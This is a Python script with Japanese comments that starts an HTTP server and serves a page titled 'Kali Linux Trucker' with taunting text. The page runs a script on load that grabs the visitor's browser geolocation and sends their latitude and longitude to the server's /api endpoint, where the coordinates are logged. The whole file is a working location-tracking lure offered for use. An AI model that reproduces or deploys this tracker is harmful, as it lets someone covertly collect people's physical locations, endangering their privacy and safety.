from http.server import BaseHTTPRequestHandler, HTTPServer
import json

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # HTMLの内容
        html_content = """
        <!DOCTYPE html>
        <html lang="ja">
            <head>
                <title>Kali Linux Trucker</title>
                <meta charset="utf-8">
            </head>
            <body>
                <h1>fuckyou!!!!!!!!</h1>
                <h1>lol lol lol lol lol</h1>
                
                <script>
                    // 位置情報をサーバーに送信
                    function sendLocationToServer(latitude, longitude) {
                        const data = {
                            latitude: latitude,
                            longitude: longitude
                        };

                        // fetchを使用してサーバーにPOSTリクエストを送信
                        fetch('/api', { // リクエストURLは /api に変更
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(data)
                        })
                        .then(response => response.json())
                        .then(data => {
                            console.log('サーバーからの応答:', data);
                        })
                        .catch(error => {
                            console.error('エラー:', error);
                        });
                    }

                    // 位置情報取得
                    if(navigator.geolocation){
                        navigator.geolocation.getCurrentPosition(
                            function(position){
                                const latitude=position.coords.latitude;
                                const longitude=position.coords.longitude;
                                sendLocationToServer(latitude,longitude);
                            },function(error){
                                sendLocationToServer("error0","error0");
                            }
                        );
                    }else{
                        sendLocationToServer("error","error");
                    }
                </script>
            </body>
        </html>
        """
        # レスポンスを送信
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html_content.encode('utf-8'))

    def do_POST(self):
        if self.path == '/api':  # エンドポイントを /api に限定
            # POSTデータの読み取り
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            # データをJSONとしてパース
            try:
                received_data = json.loads(post_data)
                print("受信したデータ:", received_data)  # サーバーログに出力
                
                # クライアントへのレスポンス
                response = {"status": "success", "message": "データを受信しました", "received_data": received_data}
            except json.JSONDecodeError:
                response = {"status": "error", "message": "不正なJSON形式です"}
            
            # レスポンス送信
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(response).encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

def run(server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler, port=8080):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"HTTPサーバーがポート {port} で起動しました...")
    httpd.serve_forever()

if __name__ == '__main__':
    run()
